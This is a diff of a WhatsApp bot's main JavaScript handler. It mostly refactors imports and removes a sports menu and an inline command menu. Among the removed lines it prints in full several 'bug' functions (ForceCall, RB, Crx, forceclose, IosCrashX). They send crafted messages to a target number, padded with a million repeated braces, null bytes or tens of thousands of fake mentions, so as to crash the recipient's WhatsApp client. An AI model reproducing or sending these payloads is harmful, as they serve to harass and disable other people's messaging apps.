@@ -29,7 +29,7 @@ const { ytsearch, ytmp3, ytmp4 } = require('@dark-yasiya/yt-dl.js');
 const { spawn, exec, execSync } = require('child_process')
 const { default: baileys, proto, jidNormalizedUser, generateWAMessage, generateWAMessageFromContent, getContentType, downloadContentFromMessage,prepareWAMessageMedia } = require("@whiskeysockets/baileys")
 
-// ========== MOVE FUNCTION IMPORTS HERE ==========
+// ==========  FUNCTION IMPORTS ==========
 const { 
   smsg, 
   sendGmail, 
@@ -38,7 +38,7 @@ const {
   generateMessageTag, 
   CheckBandwidth, 
   getBuffer, 
-  getGroupAdmins,  // This is now imported BEFORE it's used
+  getGroupAdmins, 
   getSizeMedia, 
   runtime, 
   fetchJson, 
@@ -49,6 +49,7 @@ const {
 const { obfuscateJS } = require("./lib/encapsulation");
 const { handleMediaUpload } = require('./lib/catbox');
 const {styletext, remind, Wikimedia, wallpaper} = require('./lib/scraper')
+const { sendMenu } = require('./DevKelvin/menu')
 const { Remini } =require('./lib/remini')
 const {
  fetchMp3DownloadUrl,
@@ -56,8 +57,9 @@ const {
   saveStatusMessage,
   acr,
   obfus,
+  handleAntiEdit,
   saveDatabase,
-  getActiveUsers,
+  GroupDB,
   ephoto,
   loadBlacklist,
   initializeDatabase,
@@ -158,237 +160,6 @@ conn.sendMessage(jidss, { react: { text: emoji, key: m.key } })
 }
 
 
-//====FUNCTION FOR SPORT MENU
-async function formatStandings(leagueCode, leagueName, { m, reply }) {
-  try {
-    const apiUrl = `${global.api}/football?code=${leagueCode}&query=standings`;
-    const response = await fetch(apiUrl);
-    const data = await response.json();
-
-    if (!data.result || !data.result.standings) {
-      return reply(`❌ Failed to fetch ${leagueName} standings. Please try again later.`);
-    }
-
-    const standings = data.result.standings;
-    let message = `*⚽ ${leagueName} Standings ⚽*\n\n`;
-    
-    standings.forEach((team) => {
-      let positionIndicator = '';
-      if (leagueCode === 'CL' || leagueCode === 'EL') {
-        if (team.position <= (leagueCode === 'CL' ? 4 : 3)) positionIndicator = '🌟 ';
-      } else {
-        if (team.position <= 4) positionIndicator = '🌟 '; 
-        else if (team.position === 5 || team.position === 6) positionIndicator = '⭐ ';
-        else if (team.position >= standings.length - 2) positionIndicator = '⚠️ '; 
-      }
-
-      message += `*${positionIndicator}${team.position}.* ${team.team}\n`;
-      message += `   📊 Played: ${team.played} | W: ${team.won} | D: ${team.draw} | L: ${team.lost}\n`;
-      message += `   ⚽ Goals: ${team.goalsFor}-${team.goalsAgainst} (GD: ${team.goalDifference > 0 ? '+' : ''}${team.goalDifference})\n`;
-      message += `   � Points: *${team.points}*\n\n`;
-    });
-
-    if (leagueCode === 'CL' || leagueCode === 'EL') {
-      message += '\n*🌟 = Qualification for next stage*';
-    } else {
-      message += '\n*🌟 = UCL | ⭐ = Europa | ⚠️ = Relegation*';
-    }
-    
-    reply(message);
-  } catch (error) {
-    console.error(`Error fetching ${leagueName} standings:`, error);
-    reply(`❌ Error fetching ${leagueName} standings. Please try again later.`);
-  }
-}
-
-async function formatMatches(leagueCode, leagueName, { m, reply }) {
-  try {
-    const apiUrl = `${global.api}/football?code=${leagueCode}&query=matches`;
-    const response = await fetch(apiUrl);
-    const data = await response.json();
-
-    if (!data.result?.matches?.length) {
-      return reply(`❌ No ${leagueName} matches found or failed to fetch data.`);
-    }
-
-    const { liveMatches, finishedMatches, otherMatches } = categorizeMatches(data.result.matches);
-
-    const messageSections = [
-      buildLiveMatchesSection(liveMatches),
-      buildFinishedMatchesSection(finishedMatches),
-      buildOtherMatchesSection(otherMatches, liveMatches, finishedMatches)
-    ].filter(Boolean);
-
-    const header = `*⚽ ${leagueName} Match Results & Live Games ⚽*\n\n`;
-    const finalMessage = messageSections.length 
-      ? header + messageSections.join('\n')
-      : header + `No current or recent matches found. Check upcoming matches using .${leagueCode.toLowerCase()}upcoming`;
-
-    reply(finalMessage);
-  } catch (error) {
-    console.error(`Error fetching ${leagueName} matches:`, error);
-    reply(`❌ Error fetching ${leagueName} matches. Please try again later.`);
-  }
-}
-
-function categorizeMatches(matches) {
-  const categories = {
-    liveMatches: [],
-    finishedMatches: [],
-    otherMatches: []
-  };
-
-  matches.forEach(match => {
-    if (match.status === 'FINISHED') {
-      categories.finishedMatches.push(match);
-    } 
-    else if (isLiveMatch(match)) {
-      categories.liveMatches.push(match);
-    } 
-    else {
-      categories.otherMatches.push(match);
-    }
-  });
-
-  return categories;
-}
-
-function isLiveMatch(match) {
-  const liveStatusIndicators = ['LIVE', 'ONGOING', 'IN_PROGRESS', 'PLAYING'];
-  return (
-    (match.status && liveStatusIndicators.some(indicator => 
-      match.status.toUpperCase().includes(indicator))) ||
-    (match.score && match.status !== 'FINISHED')
-  );
-}
-
-function buildLiveMatchesSection(liveMatches) {
-  if (!liveMatches.length) return null;
-  
-  let section = `🔥 *Live Matches (${liveMatches.length})*\n\n`;
-  liveMatches.forEach((match, index) => {
-    section += `${index + 1}. 🟢 ${match.status || 'LIVE'}\n`;
-    section += `   ${match.homeTeam} vs ${match.awayTeam}\n`;
-    if (match.score) section += `   📊 Score: ${match.score}\n`;
-    if (match.time) section += `   ⏱️ Minute: ${match.time || 'Unknown'}\n`;
-    section += '\n';
-  });
-  
-  return section;
-}
-
-function buildFinishedMatchesSection(finishedMatches) {
-  if (!finishedMatches.length) return null;
-
-  let section = `✅ *Recent Results (${finishedMatches.length})*\n\n`;
-  const byMatchday = finishedMatches.reduce((acc, match) => {
-    (acc[match.matchday] = acc[match.matchday] || []).push(match);
-    return acc;
-  }, {});
-
-  Object.keys(byMatchday)
-    .sort((a, b) => b - a)
-    .forEach(matchday => {
-      section += `📅 *Matchday ${matchday} (${byMatchday[matchday].length} matches)*:\n`;
-      byMatchday[matchday].forEach((match, index) => {
-        const winnerEmoji = match.winner === 'Draw' ? '⚖️' : '🏆';
-        section += `${index + 1}. ${match.homeTeam} ${match.score} ${match.awayTeam}\n`;
-        section += `   ${winnerEmoji} ${match.winner}\n\n`;
-      });
-    });
-
-  return section;
-}
-
-function buildOtherMatchesSection(otherMatches, liveMatches, finishedMatches) {
-  if (!otherMatches.length || liveMatches.length || finishedMatches.length) return null;
-  
-  let section = `📌 *Other Matches (${otherMatches.length})*\n\n`;
-  otherMatches.forEach((match, index) => {
-    section += `${index + 1}. ${match.homeTeam} vs ${match.awayTeam}\n`;
-    section += `   Status: ${match.status || 'Unknown'}\n\n`;
-  });
-  
-  return section;
-}
-
-async function formatTopScorers(leagueCode, leagueName, { m, reply }) {
-  try {
-    const apiUrl = `${global.api}/football?code=${leagueCode}&query=scorers`;
-    const response = await fetch(apiUrl);
-    const data = await response.json();
-
-    if (!data.result || !data.result.topScorers) {
-      return reply(`❌ No ${leagueName} top scorers data found.`);
-    }
-
-    const scorers = data.result.topScorers;
-    let message = `*⚽ ${leagueName} Top Scorers ⚽*\n\n`;
-    message += '🏆 *Golden Boot Race*\n\n';
-
-    scorers.forEach(player => {
-      message += `*${player.rank}.* ${player.player} (${player.team})\n`;
-      message += `   ⚽ Goals: *${player.goals}*`;
-      message += ` | 🎯 Assists: ${player.assists}`;
-      message += ` | ⏏️ Penalties: ${player.penalties}\n\n`;
-    });
-
-    reply(message);
-  } catch (error) {
-    console.error(`Error fetching ${leagueName} top scorers:`, error);
-    reply(`❌ Error fetching ${leagueName} top scorers. Please try again later.`);
-  }
-}
-
-async function formatUpcomingMatches(leagueCode, leagueName, { m, reply }) {
-  try {
-    const apiUrl = `${global.api}/football?code=${leagueCode}&query=upcoming`;
-    const response = await fetch(apiUrl);
-    const data = await response.json();
-
-    if (!data.result || !data.result.upcomingMatches || data.result.upcomingMatches.length === 0) {
-      return reply(`❌ No upcoming ${leagueName} matches found.`);
-    }
-
-    const matches = data.result.upcomingMatches;
-    let message = `*📅 Upcoming ${leagueName} Matches ⚽*\n\n`;
-
-    const matchesByMatchday = {};
-    matches.forEach(match => {
-      if (!matchesByMatchday[match.matchday]) {
-        matchesByMatchday[match.matchday] = [];
-      }
-      matchesByMatchday[match.matchday].push(match);
-    });
-
-    const sortedMatchdays = Object.keys(matchesByMatchday).sort((a, b) => a - b);
-
-    sortedMatchdays.forEach(matchday => {
-      message += `*🗓️ Matchday ${matchday}:*\n`;
-      
-      matchesByMatchday[matchday].forEach(match => {
-        const matchDate = new Date(match.date);
-        const formattedDate = matchDate.toLocaleString('en-US', {
-          weekday: 'short',
-          month: 'short',
-          day: 'numeric',
-          hour: '2-digit',
-          minute: '2-digit'
-        });
-        
-        message += `\n⏰ ${formattedDate}\n`;
-        message += `   🏠 ${match.homeTeam} vs ${match.awayTeam} 🚌\n\n`;
-      });
-      
-      message += '\n';
-    });
-
-    reply(message);
-  } catch (error) {
-    console.error(`Error fetching upcoming ${leagueName} matches:`, error);
-    reply(`❌ Error fetching upcoming ${leagueName} matches. Please try again later.`);
-  }
-}
 
 // ========== PRIVACY SETTING DESCRIPTIONS ==========
 function getLastSeenDescription(option) {
@@ -430,19 +201,6 @@ function getProfilePictureDescription(option) {
 // ========== END PRIVACY SETTING DESCRIPTIONS ==========
 
 
-   // Memory formatting function
-    const formatMemory = (memory) => {
-        return memory < 1024 * 1024 * 1024
-            ? Math.round(memory / 1024 / 1024) + ' MB'
-            : Math.round(memory / 1024 / 1024 / 1024) + ' GB';
-    };
-
-    // Memory progress bar (System RAM usage)
-    const progressBar = (used, total, size = 10) => {
-        let percentage = Math.round((used / total) * size);
-        let bar = '█'.repeat(percentage) + '░'.repeat(size - percentage);
-        return `[${bar}] ${Math.round((used / total) * 100)}%`;
-};
 // function that converts to audio and video====
 async function webp2mp4(source) {
   let form = new FormData();
@@ -761,846 +519,32 @@ const reply = (teks) => {
                 }
             }, { quoted: m })
         }
-const buggy = `༒𝗞𝗘𝗩𝗜𝗡 𝗧𝗘𝗖𝗛༒\n\n𝖣𝖾𝗅𝗂𝗏𝖾𝗋𝗂𝗇𝗀 𝗍𝗈 ${q}\n 𝖲𝖾𝗇𝖽𝖾𝗋: ${pushname} \n𝖢𝗈𝗆𝗆𝖺𝗇𝖽:${command}`
-async function thumb(){
-conn.sendMessage(m.chat, {  
-            image: { url: "https://files.catbox.moe/07de9r.jpg" },  
-            caption:buggy,   
-            contextInfo: {
-                mentionedJid: [m.sender],
-                forwardedNewsletterMessageInfo: {
-                    newsletterName: "༒𝗞𝗘𝗩𝗜𝗡 𝗧𝗘𝗖𝗛༒",
-                    newsletterJid: `120363322464215140@newsletter` 
-                },
-                
-            }
-        },{ quoted: st })
-        }
-async function bugLoad () {
-var Lbugs = [
-"𝕾𝖊",
-"𝖓𝖉",
-"𝖎𝖓𝖌",
-"𝖇𝖚",
-"𝖌𝖘",
-"𝕾𝖊𝖓𝖉𝖎𝖓𝖌 𝖇𝖚𝖌𝖘.."
-]
-let { key } = await conn.sendMessage(from, {text: '𝐋𝐨𝐚𝐝𝐢𝐧𝐠'})
-
-for (let i = 0; i < Lbugs.length; i++) {
-await  conn.sendMessage(from, {text: Lbugs[i], edit: key });
-}
-}
-async function doneLoad () {
-var Sbugs = [
-"𝕾𝖚𝖈𝖈",
-"𝖊𝖘𝖘",
-"𝖘𝖊𝖓𝖉",
-"𝖉𝖎𝖓𝖌",
-"𝖇𝖚𝖌𝖘",
-"𝕾𝖚𝖈𝖈𝖊𝖘𝖘 𝖘𝖊𝖓𝖉𝖎𝖓𝖌 𝖇𝖚𝖌𝖘..."
-]
-let { key } = await conn.sendMessage(from, {text: '𝐋𝐨𝐚𝐝𝐢𝐧𝐠'})
-
-for (let i = 0; i < Sbugs.length; i++) {
-await  conn.sendMessage(from, {text: Sbugs[i], edit: key });
-}
-}
-const st = {
-  key: {
-    fromMe: false,
-    participant: "13135550002@s.whatsapp.net",
-    remoteJid: "status@broadcast"
-  },
-  message: {
-    orderMessage: {
-      orderId: "2009",
-      
-      itemCount: "4444",
-      status: "INQUIRY",
-      surface: "CATALOG",
-      message: `Sender : @${m.sender.split('@')[0]}\nCommand : ${command}`,
-      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
-    }
-  },
-  contextInfo: {
-    mentionedJid: ["1203633695141052429@s.whatsapp.net"],
-    forwardingScore: 999,
-    isForwarded: true,
-  }
-}
-const Kevin = {
-            key: {
-                fromMe: false,
-                participant: `0@s.whatsapp.net`,
-                ...(from ? { remoteJid: "status@broadcast" } : {})
-            },
-            message: {
-                'contactMessage': {
-                    'displayName': `Kevin`,
-                    'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
-                    'jpegThumbnail': { url: 'https://files.catbox.moe/yqbio5.jpg' }
-                }
-            }
-        }
-async function ForceCall(target) {
-let InJectXploit = JSON.stringify({
-status: true,
-criador: "TheXtordcv",
-resultado: {
-type: "md",
-ws: {
-_events: {
-"CB:ib,,dirty": ["Array"]
-},
-_eventsCount: 800000,
-_maxListeners: 0,
-url: "wss://web.whatsapp.com/ws/chat",
-config: {
-version: ["Array"],
-browser: ["Array"],
-waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
-sockCectTimeoutMs: 20000,
-keepAliveIntervalMs: 30000,
-logger: {},
-printQRInTerminal: false,
-emitOwnEvents: true,
-defaultQueryTimeoutMs: 60000,
-customUploadHosts: [],
-retryRequestDelayMs: 250,
-maxMsgRetryCount: 5,
-fireInitQueries: true,
-auth: {
-Object: "authData"
-},
-markOnlineOnsockCect: true,
-syncFullHistory: true,
-linkPreviewImageThumbnailWidth: 192,
-transactionOpts: {
-Object: "transactionOptsData"
-},
-generateHighQualityLinkPreview: false,
-options: {},
-appStateMacVerification: {
-Object: "appStateMacData"
-},
-mobile: true
-}
-}
-}
-});
-let msg = await generateWAMessageFromContent(
-target, {
-viewOnceMessage: {
-message: {
-interactiveMessage: {
-header: {
-title: "",
-hasMediaAttachment: false,
-},
-body: {
-text: "⩟⬦𪲁 𝐑‌‌𝐈𝐙‌𝐗𝐕‌𝐄𝐋𝐙‌‌‌‌‌𝐗‌‌𝐒 - 𝚵𝚳𝚸𝚬𝚪𝚯𝐑",
-},
-nativeFlowMessage: {
-messageParamsJson: "{".repeat(10000),
-buttons: [{
-name: "single_select",
-buttonParamsJson: InJectXploit,
-},
-{
-name: "call_permission_request",
-buttonParamsJson: InJectXploit + "{",
-},
-],
-},
-},
-},
-},
-}, {}
-);
-
-await conn.relayMessage(target, msg.message, {
-messageId: msg.key.id,
-participant: {
-jid: target
-},
-});
-}
-
-async function RB(target) {
-  try {
-    let message = {
-      ephemeralMessage: {
-        message: {
-          interactiveMessage: {
-            header: {
-              title: "𝕶𝖓𝖔𝖝𝖋𝖆𝖒𝖎𝖑𝖞",
-              hasMediaAttachment: false,
-              locationMessage: {
-                degreesLatitude: -999.035,
-                degreesLongitude: 922.999999999999,
-                name: "\u200F",
-                address: "\u200D",
-              },
-            },
-            body: {
-              text: "༒𝗞𝗘𝗩𝗜𝗡 𝗧𝗘𝗖𝗛༒",
-            },
-            nativeFlowMessage: {
-              messageParamsJson: "\n".repeat(10000),
-            },
-            contextInfo: {
-              participant: target,
-              mentionedJid: [
-                "0@s.whatsapp.net",
-                ...Array.from(
-                  {
-                    length: 30000,
-                  },
-                  () =>
-                    "1" +
-                    Math.floor(Math.random() * 5000000) +
-                    "@s.whatsapp.net"
-                ),
-              ],
-            },
-          },
-        },
-      },
-    };
-
-    await conn.relayMessage(target, message, {
-      messageId: null,
-      participant: { jid: target },
-      userJid: target,
-    });
-  } catch (err) {
-    console.log(err);
-  }
-  console.log(chalk.yellow.bold("Sent Bugs"))
-}
-async function Crx(target) {
-    await conn.relayMessage(number, {
-        viewOnceMessage: {
-            message: {
-                interactiveResponseMessage: {
-                    body: {
-                        text: "@𝗱𝗲𝘃𝗼𝗿𝘀𝗶𝘅 • #𝘀𝗵𝗼𝘄𝗼𝗳𝗯𝘂𝗴 🩸",
-                        format: "DEFAULT"
-                    },
-                    nativeFlowResponseMessage: {
-                        name: "call_permission_request",
-                        paramsJson: "\u0000".repeat(1000000),
-                        version: 3
-                    }
-                }
-            }
-        }
-    }, { participant: { jid: target}});
-}
-async function forceclose(xvampire, target) {
-  const message = {
-    viewOnceMessage: {
-      message: {
-        stickerMessage: {
-          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
-          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
-          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
-          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
-          mimetype: "image/webp",
-          directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
-          fileLength: { low: 1, high: 0, unsigned: true },
-          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
-          firstFrameLength: 19904,
-          firstFrameSidecar: "KN4kQ5pyABRAgA==",
-          isAnimated: true,
-          contextInfo: {
-            mentionedJid: [
-              "0@s.whatsapp.net",
-              ...Array.from({ length: 1900 }, () =>
-                "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
-              )
-            ],
-            groupMentions: [],
-            entryPointConversionSource: "non_contact",
-            entryPointConversionApp: "whatsapp",
-            entryPointConversionDelaySeconds: 467593
-          },
-          stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
-          isAvatar: false,
-          isAiSticker: false,
-          isLottie: false
-        }
-      }
-    }
-  }
-
-  const msg = generateWAMessageFromContent(target, message, {})
-
-  await conn.relayMessage("status@broadcast", msg.message, {
-    messageId: msg.key.id,
-    statusJidList: [target],
-    additionalNodes: [{
-      tag: "meta",
-      attrs: {},
-      content: [{
-        tag: "mentioned_users",
-        attrs: {},
-        content: [{ tag: "to", attrs: { jid: target } }]
-      }]
-    }]
-  })
-}
-
-
-async function IosCrashX(target) { 
-  var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
-    'viewOnceMessage': {
-      'message': {
-        'interactiveMessage': {
-          'header': {
-            'title': '',
-            'subtitle': " "
-          },
-          'body': {
-            'text': "xvampire"
-          },
-          'footer': {
-            'text': 'xp'
-          },
-          'nativeFlowMessage': {
-            'buttons': [{
-              'name': 'cta_url',
-              'buttonParamsJson': "{ \"display_text\" : \"Brutalityᬊᬁ\", \"url\" : \"\", \"merchant_url\" : \"\" }"
-            }],
-            'messageParamsJson': "{".repeat(1000000)
-          }
-        }
-      }
-    }
-  }), {
-    'userJid': target
-  });
-  await conn.relayMessage(target, messageContent.message, { 
-    'participant': {
-      'jid': target
-    },
-    'messageId': messageContent.key.id
-  });
-  console.log(chalk.blue.bold("Sending vampire Brutality bug"))
-}
-
 // ========== AI CHATBOT EXECUTION ==========
 if (getAIChatbotState() === "true" && body && !m.key.fromMe && !isCmd) {
     await handleAIChatbot(m, conn, body, from, isGroup, botNumber, isCmd, prefix);
 }
 
+await handleAntiEdit(m, conn);
+
 switch (command) {
-    case 'menu':
-    case 'kevin':
-    case 'vinic': {
-        // Send loading message first
-const loadingMsg = await conn.sendMessage(m.chat, { 
-    text: '🔄 *Loading menu...*' 
-}, { quoted: m });
-
-try {
-// Calculate memory usage
-const totalMemory = os.totalmem();
-const freeMemory = os.freemem();
-const systemUsedMemory = totalMemory - freeMemory;
-    // Define menu sections for organization
-    const menuSections = {
-            header: {
-                title: '🔥ᴠɪɴɪᴄ xᴍᴅ🔮',
-                content: [
-                    `👤 ᴜsᴇʀ: ${global.ownername}`,
-                        `🤖 ʙᴏᴛɴᴀᴍᴇ: ${global.botname}`,
-                        `🌍 ᴍᴏᴅᴇ: ${conn.public ? 'ᴘᴜʙʟɪᴄ' : 'ᴘʀɪᴠᴀᴛᴇ'}`,
-                        `🛠️ ᴘʀᴇғɪx: [ ${prefix} ]`,
-                        `📈 ᴄᴍᴅs: 100+`, // Replace with actual command count if available
-                        `🧪 ᴠᴇʀsɪᴏɴ: ${global.versions}`,
-                        ` 💾 𝚁𝙰𝙼: ${progressBar(systemUsedMemory, totalMemory)}\n`,
-                    `👤 ᴅᴇᴠ: ☘ ᴋᴇʟᴠɪɴ ᴛᴇᴄʜ ☘`,
-                ],
-            },
-            
-                owner: {
-                    title: ' *OWNER MENU*',
-                    commands: [
-                        'addowner',
-                        '𝙸𝚍𝚌𝚑', '𝙲𝚛𝚎𝚊𝚝𝚎𝚌𝚑', 'creategroup',
-                         'del', 'setpp', 'delpp', 'lastseen', 'setprefix', 'groupid', 'readreceipts', 'reportbug', 'clearchat', 'hack', 'groupjids', 'broadcast', 'disappear', 'disappearstatus','clearchat', 'react', 'restart', 'addignorelist', 'delignorelist', 'deljunk', 'features',
-                        'listblocked', 'listsudo', 'setprofilename',  'listignored', 'online', 'join', 'leave', 'setbio', 'backup', 'reqeust', 'block', 'gpass','toviewonce', 'setownername', 'setbotname', 'unblock', 'unblockall', 'gcaddprivacy', 'ppprivancy', 'tostatus',
-                          'vv', 'vv2', 'idch', 'getpp',
-                    ],
-                },
-                group: {
-                    title: ' *GROUP MENU* ',
-                    commands: [
-                        '𝖧𝗂𝖽𝖾𝗍𝖺𝗀', '𝖪𝗂𝖼𝗄', '𝖱𝖾𝗌𝖾𝗍𝗅𝗂𝗇𝗄', 'linkgc', 'checkchan',
-                        'antilink', 'listonline', 'add', 'listactive', 'listinactive', 'close',
-                        'open', 'kick', 'topchatters', 'listadmin',  'kickall', 'closetime', 'groupdisappear', 'tagall2', 'lockgc', 'unlockgc', 'opentime', 'poll', 'totalmembers', 'mediatag', 'getgrouppp', 'antilink', 'tagall', 'groupinfo', 'kick2', 'tagadmin2', 'setgroupname', 'delgrouppp', 'invite', 'editinfo', 'approve', 'disapproveall', 'listrequest', 'promote', 'demote', 'setdisc', 'vcf',
-                    ],
-                },
-                ai: {
-                title: ' *AI MENU*',
-                commands: ['generate', 'ai', 'copilot', 'deepseek', 'flux', 'gpt'],
-                },
-                audio: {
-                title: ' *AUDIO MENU*',
-                commands: ['bass', 'treble', 'blown', 'robot', 'reverse', 'instrumental', 'vocalremove', 'karaoke', 'volaudio', 'fast', 'slow'],
-                },
-                image: {
-                title: ' *IMAGE MENU*',
-                commands: ['wallapaper', 'remini'],
-                },
-                reaction: {
-                title: ' *REACTION MENU*',
-                commands: ['kiss', 'blush', 'kick', 'slap', 'dance', 'bully', 'kill', 'hug', 'happy', 'cry'],
-                },
-                features: {
-                title: ' *FEATURES MENU*',
-                commands: ['antidelete', 'anticall', 'antibug',  'autorecording', 'autotyping', 'welcome', 'chatbot', 'autoread', 'adminevent', 'autoviewstatus', 'autoreactstatus', 'antiedit'],
-                },
-                download: {
-                    title: ' *DOWNLOAD MENU* ',
-                    commands: ['play', 'play2', 'song', 'song2', 'gitclone', 'ringtone', 'download', 'pinterest', 'mediafire', 'itunes', 'ytmp4', 'ytstalk', 'apk', 'gdrive', 'playdoc', 'tiktok', 'tiktok2', 'instagram', 'video', 'video2', 'tiktokaudio', 'save', 'facebook'],
-                },
-                sport: {
-                title: ' *SPORT MENU*',
-                commands:['worldcupmatches', 'elcmatches', 'europaleaguematches', 'ligue1matches', 'eplmatches', 'championsleaguematches', 'bundesligamatches', 'serieamatches', 'worldcupupcoming', 'ligue1upcoming', 'europaleagueupcoming', 'wrestlingevent', 'wwenews', 'wweschedule'],
-                },
-                convert: {
-                    title: ' *CONVERT MENU* ',
-                    commands: ['toaudio', 'toimage', 'url', 'tovideo', 'topdf', 'sticker'],
-                },
-                cmdTool: {
-                    title: ' *BOTSTATUS MENU* ',
-                    commands: ['ping', 'bothosting', 'repo', 'botstatus', 'botinfo', 'sc', 'serverinfo', 'alive'],
-                },
-                other: {
-                    title: ' *TOOLS MENU*',
-                    commands: ['time', 'calculate',  'owner', 'dev', 'fliptext', 'translate', 'ss2', 'sswebpc', 'kevinfarm', 'say', 'getdevice', 'ss','userinfo', 'npm', 'take', 'checkapi', 'footballhelp', 'qrcode', 'gsmarena', 'removebg', 'obfuscate', 'getabout', 'tinylink', 'vcc', 'getbussiness', 'listpc', 'sswebpc'],
-                },
-                helpers: {
-                title: ' *SUPPORT MENU*',
-                commands: ['helpers'],
-                },
-                ephoto: {
-                    title: ' *EPHOTO360MAKER MENU* ',
-                    commands: ['blackpinklogo', 'blackpinkstyle', 'glossysilver', 'glitchtext', 'arting', 'advancedglow', 'cartoonstyle', 'deadpool', 'deletingtext', 'luxurygold', 'pixelglitch', 'multicoloredneon','effectclouds', 'flagtext' ,'freecreat','galaxystyle', 'galaxywallpaper', 'glowingtext', 'makingneon', 'matrix','royaltext', 'sand', 'summerbeach','topography', 'typography', 'flux', 'dragonball'],
-                },
-                search: {
-                    title: ' *SEARCH MENU* ',
-                    commands: ['lyrics', 'chord', 'weather', 'movie', 'define', 'gitstalk', 'tiktokstalk', 'ytsearch', 'shazam'],
-                },
-                fun: {
-                    title: ' *FUN MENU* ',
-                    commands: ['dare', 'Quotes', 'truth', 'fact', 'truthdetecter', 'valentines', 'advice', 'motivate', 'pickupline', '8balls', 'mee', 'emoji', 'lovetest', 'character', 'compatibility', 'compliment',  'jokes'],
-                },
-                religion: {
-                    title: ' *RELIGION MENU* ',
-                    commands: ['Bible', 'Biblelist', 'Quran'],
-                },
-            };
-            
-    
-    // Function to format the menu
-const formatMenu = () => {
-    let menu = `╭═✦〔 🤖 ᴠɪɴɪᴄ xᴅ 〕✦═╮\n`;
-    menu += menuSections.header.content.map(line => `┃ ${line}`).join('\n') + '\n';
-    menu += `╰═✦═════════════╯\n\n`;
-
-    for (const section of Object.values(menuSections).slice(1)) {
-        // Format the title with the box style
-        menu += `╭━◈${section.title.toUpperCase()} ◈\n`;
-        menu += section.commands.map(cmd => `│ ➸ ${prefix}${cmd}`).join('\n') + '\n';
-        menu += `┗▣\n\n`;
-    }
-         
-    menu += `> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋᴇʟᴠɪɴ ᴛᴇᴄʜ `;
-    return menu;
-};
-
-
-      try {
-    // Array of image URLs to choose from randomly
-    const imageUrls = [
-        'https://files.catbox.moe/ptpl5c.jpeg',
-        'https://files.catbox.moe/uw1n4n.jpg'
-    ];
-    
-    // Array of audio URLs to choose from randomly
-    const audioUrls = [
-        'https://files.catbox.moe/jdozs7.mp3',
-        'https://files.catbox.moe/yny58w.mp3',
-        'https://files.catbox.moe/zhr5m2.mp3'
-    ];
-    
-    // Randomly select one image and one audio
-    const randomImage = imageUrls[Math.floor(Math.random() * imageUrls.length)];
-    const randomAudio = audioUrls[Math.floor(Math.random() * audioUrls.length)];
-
-    // Send menu with random image
-    await conn.sendMessage(m.chat, {
-        image: { url: randomImage },
-        caption: formatMenu(),
-        contextInfo: {
-            mentionedJid: [m.sender],
-            forwardedNewsletterMessageInfo: {
-                newsletterName: '🔮 ᴊᴏɪɴ ᴋᴇʟᴠɪɴ ᴛᴇᴄʜ🔮',
-                newsletterJid: '120363401548261516@newsletter',
-            },
-            isForwarded: true,
-            // externalAdreply has been removed 
-            
-            showAdAttribution: true,
-            title: global.botname || 'ᴠɪɴɪᴄ xᴍᴅ',
-            body: '☘ ᴋᴇʟᴠɪɴ ᴛᴇᴄʜ ☘',
-            mediaType: 3,
-            renderLargerThumbnail: false,
-            thumbnail: cina, 
-            sourceUrl: 'https://whatsapp.com/channel/0029Vb6eR1r05MUgYul6Pc2W',
-        },
-    }, { quoted: Kevin });
-
-    // Send random audio
-    await conn.sendMessage(m.chat, {
-        audio: { url: randomAudio },
-        mimetype: 'audio/mpeg',
-        mp3: true,
-    });
-
-} catch (error) {
-    console.error('Error sending menu:', error);
-    await conn.sendMessage(m.chat, {
-        text: 'Error displaying menu. Please try again!'
-    });
-}
-} catch (error) {
-    console.error('Error in menu command:', error);
-    await conn.sendMessage(m.chat, {
-        text: 'An error occurred while processing the menu command.'
-    });
-}
-    break;
-}
-case "delprem":
-case "removeprem":
-case "unpremium": {
-    if (!Access) return reply(mess.owner);
-    if (!text) return reply(`*Usage:* ${prefix}delprem [number]\n*Example:* ${prefix}delprem 256xxx`);
+case 'menu':
+case 'kevin':
+case 'vinic': {
+    // Send loading message first
+    const loadingMsg = await conn.sendMessage(m.chat, { 
+        text: '🔄 *Loading menu...*' 
+    }, { quoted: m });
 
     try {
-        // Send loading reaction
-        await conn.sendMessage(m.chat, {
-            react: {
-                text: "⏳",
-                key: m.key
-            }
-        });
-
-        // Clean and validate the number
-        let phoneNumber = text.split("|")[0].replace(/[^0-9]/g, '');
-        
-        // Add country code if missing (assuming Uganda +256 by default)
-        if (phoneNumber.startsWith('0')) {
-            phoneNumber = '256' + phoneNumber.substring(1);
-        } else if (phoneNumber.length === 9 && !phoneNumber.startsWith('256')) {
-            phoneNumber = '256' + phoneNumber;
-        }
-        
-        const fullNumber = phoneNumber + '@s.whatsapp.net';
-
-        // Load premium list
-        const premPath = './start/lib/database/premium.json';
-        let prem = [];
-        
-        // Ensure directory exists
-        const dirPath = path.dirname(premPath);
-        if (!fs.existsSync(dirPath)) {
-            fs.mkdirSync(dirPath, { recursive: true });
-        }
-        
-        // Load existing premium users
-        if (fs.existsSync(premPath)) {
-            try {
-                prem = JSON.parse(fs.readFileSync(premPath, 'utf-8'));
-            } catch (e) {
-                console.error('Error parsing premium.json:', e);
-                prem = [];
-            }
-        }
